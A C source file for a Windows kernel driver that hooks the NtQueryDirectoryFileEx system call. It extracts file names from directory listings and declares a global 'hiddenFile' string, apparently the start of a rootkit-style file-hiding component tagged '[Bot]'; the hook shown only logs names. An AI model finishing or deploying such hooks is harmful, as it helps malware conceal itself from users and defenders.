#include <ntifs.h>

#include "querydir.h"
#include "handler.h"

UNICODE_STRING hiddenFile;

static void getFileName(PUNICODE_STRING filename, PVOID fileInfo, FILE_INFORMATION_CLASS fileInfoClass) {
	switch (fileInfoClass) {
		case FileDirectoryInformation:
			filename->Buffer = ((PFILE_DIRECTORY_INFORMATION)fileInfo)->FileName;
			filename->Length = ((PFILE_DIRECTORY_INFORMATION)fileInfo)->FileNameLength;
			break;
		case FileFullDirectoryInformation:
			filename->Buffer = ((PFILE_FULL_DIR_INFORMATION)fileInfo)->FileName;
			filename->Length = ((PFILE_FULL_DIR_INFORMATION)fileInfo)->FileNameLength;
			break;
		case FileBothDirectoryInformation:
			filename->Buffer = ((PFILE_BOTH_DIR_INFORMATION)fileInfo)->FileName;
			filename->Length = ((PFILE_BOTH_DIR_INFORMATION)fileInfo)->FileNameLength;
			break;
		case FileNamesInformation:
			filename->Buffer = ((PFILE_NAMES_INFORMATION)fileInfo)->FileName;
			filename->Length = ((PFILE_NAMES_INFORMATION)fileInfo)->FileNameLength;
			break;
		case FileIdBothDirectoryInformation:
			filename->Buffer = ((PFILE_ID_BOTH_DIR_INFORMATION)fileInfo)->FileName;
			filename->Length = ((PFILE_ID_BOTH_DIR_INFORMATION)fileInfo)->FileNameLength;
			break;
		case FileIdFullDirectoryInformation:
			filename->Buffer = ((PFILE_ID_FULL_DIR_INFORMATION)fileInfo)->FileName;
			filename->Length = ((PFILE_ID_FULL_DIR_INFORMATION)fileInfo)->FileNameLength;
			break;
		case FileIdGlobalTxDirectoryInformation:
			filename->Buffer = ((PFILE_ID_GLOBAL_TX_DIR_INFORMATION)fileInfo)->FileName;
			filename->Length = ((PFILE_ID_GLOBAL_TX_DIR_INFORMATION)fileInfo)->FileNameLength;
			break;
		case FileIdExtdDirectoryInformation:
			filename->Buffer = ((PFILE_ID_EXTD_DIR_INFORMATION)fileInfo)->FileName;
			filename->Length = ((PFILE_ID_EXTD_DIR_INFORMATION)fileInfo)->FileNameLength;
			break;
		case FileIdExtdBothDirectoryInformation:
			filename->Buffer = ((PFILE_ID_EXTD_BOTH_DIR_INFORMATION)fileInfo)->FileName;
			filename->Length = ((PFILE_ID_EXTD_BOTH_DIR_INFORMATION)fileInfo)->FileNameLength;
			break;
		default:
			filename->Buffer = NULL;
			filename->Length = 0;
			break;
	}
}

NTSTATUS NTAPI hookNtQueryDirectoryFileEx(
	HANDLE FileHandle,
	HANDLE Event,
	PIO_APC_ROUTINE ApcRoutine,
	PVOID ApcContext,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID FileInformation,
	ULONG Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	ULONG QueryFlags,  // Valid flags are in SL_QUERY_DIRECTORY_MASK
	PUNICODE_STRING FileName
) {
	NTSTATUS status;
	UNICODE_STRING us;

	status = origNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);

	getFileName(&us, FileInformation, FileInformationClass);

	DbgPrintEx(0, 0, "[Bot] dir hook %wZ\n", us);
	
	return status;
}